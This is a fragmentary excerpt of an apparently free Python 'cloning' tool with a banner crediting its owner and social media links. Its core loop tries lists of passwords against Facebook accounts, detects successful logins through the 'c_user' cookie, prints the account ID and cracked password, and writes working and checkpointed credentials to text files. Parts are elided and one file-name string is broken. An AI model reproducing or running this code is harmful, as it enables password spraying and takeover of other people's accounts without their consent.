...
///////          //////        //////// 
 Ahsam fuck BCZ
\33[1;37m----------------------------------------------
→   Owner      :  MD FAIJUL ISLAM
→   Facebook   :  MD FAIJUL
→   Github     :  Mdfaijul01
→   Tool Type  :  \x1b[1;95mfree
\x1b[1;97m→   Version    :  1.02
\33[1;37m----------------------------------------------""")
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://www.facebook.com/AHSAM.JOIYA');riaz()
	if riaz1 =='2':
		bangla()
	else:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[AUH-OK] '+cid+'|'+ps+'\033[0;97m')
                open('
.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[AUH-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('B-C-Z-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
